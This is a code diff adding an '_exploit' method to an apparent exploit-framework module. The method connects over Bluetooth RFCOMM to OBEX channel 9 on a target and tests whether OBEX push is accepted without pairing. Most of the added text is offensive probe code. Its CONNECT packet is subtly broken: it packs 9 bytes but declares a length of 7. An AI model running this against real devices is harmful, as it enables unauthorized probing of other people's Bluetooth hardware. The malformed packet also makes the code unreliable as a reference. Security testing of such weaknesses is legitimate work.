@@ -149,3 +149,48 @@ class Exploit(Exploit):
         print_status("  - Disable OBEX push profile on IoT devices")
         print_status("  - Update Bluetooth stack to enforce pairing before OBEX")
 
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E OBEX push: connect via RFCOMM to OBEX channel and send OPP header."""
+        import socket as _sock
+        import struct
+
+        target = str(self.target_addr).strip()
+        if not target or ":" not in target:
+            print_info("E2E OBEX requires target_addr.")
+            return
+
+        print_status(f"OBEX Push E2E probe against {target}")
+
+        obex_channel = 9
+        try:
+            rfcomm = _sock.socket(31, _sock.SOCK_STREAM, 3)
+            rfcomm.settimeout(5.0)
+            rfcomm.connect((target, obex_channel))
+        except OSError as exc:
+            print_info(f"RFCOMM connect to channel {obex_channel} failed: {exc}")
+            return
+
+        try:
+            obex_connect = struct.pack(">BHBbHH", 0x80, 7, 0x10, 0x00, 0x00, 0x2000)
+            rfcomm.send(obex_connect)
+            print_status("OBEX CONNECT request sent")
+
+            try:
+                resp = rfcomm.recv(256)
+                if resp and resp[0] == 0xA0:
+                    print_success("OBEX CONNECT accepted: device allows push without pairing")
+                elif resp:
+                    print_info(f"OBEX response: 0x{resp[0]:02X} (non-success)")
+            except (OSError, TimeoutError):
+                print_info("No OBEX response (timeout)")
+
+            obex_disconnect = struct.pack(">BH", 0x81, 3)
+            rfcomm.send(obex_disconnect)
+            print_status("OBEX DISCONNECT sent")
+        finally:
+            rfcomm.close()
+
+        print_success("OBEX push E2E probe completed.")
+
